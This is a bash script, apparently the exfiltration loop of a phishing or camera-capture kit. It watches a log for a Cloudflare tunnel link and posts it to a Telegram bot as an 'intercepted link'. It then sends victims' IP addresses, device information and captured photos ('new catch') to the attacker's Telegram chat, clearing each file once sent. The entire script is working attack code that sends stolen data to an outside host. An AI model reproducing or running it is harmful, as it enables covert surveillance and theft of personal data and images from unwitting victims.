#!/bin/bash
source .tg_config
OLD_LINK=""

while true; do
    LINK=$(grep -Eiho 'https://[-0-9a-z.]*\.trycloudflare.com' tunnel.log 2>/dev/null | head -n 1)
    if [ ! -z "$LINK" ] && [ "$LINK" != "$OLD_LINK" ]; then
        curl -s -X POST "https://api.telegram.org/bot$TOKEN/sendMessage" -d "chat_id=$CHAT_ID" -d "text=🚀 ССЫЛКА ПЕРЕХВАЧЕНА:%0A%0A$LINK" > /dev/null
        OLD_LINK=$LINK
    fi

    # Отправка IP
    if [ -f "ip.txt" ]; then
        VAL=$(cat ip.txt)
        if [ ! -z "$VAL" ]; then
            curl -s -X POST "https://api.telegram.org/bot$TOKEN/sendMessage" -d "chat_id=$CHAT_ID" -d "text=🌐 $VAL" > /dev/null
            rm -f ip.txt
        fi
    fi

    # Отправка данных устройства
    if [ -f "info.txt" ]; then
        VAL=$(cat info.txt)
        if [ ! -z "$VAL" ]; then
            curl -s -X POST "https://api.telegram.org/bot$TOKEN/sendMessage" -d "chat_id=$CHAT_ID" -d "text=📱 $VAL" > /dev/null
            rm -f info.txt
        fi
    fi

    # Отправка фото
    for img in images/*.png; do
        if [ -f "$img" ]; then
            curl -s -X POST "https://api.telegram.org/bot$TOKEN/sendPhoto" -F "chat_id=$CHAT_ID" -F "photo=@$img" -F "caption=📸 НОВЫЙ УЛОВ!" > /dev/null
            mkdir -p images/sent
            mv "$img" images/sent/
        fi
    done
    sleep 2
done
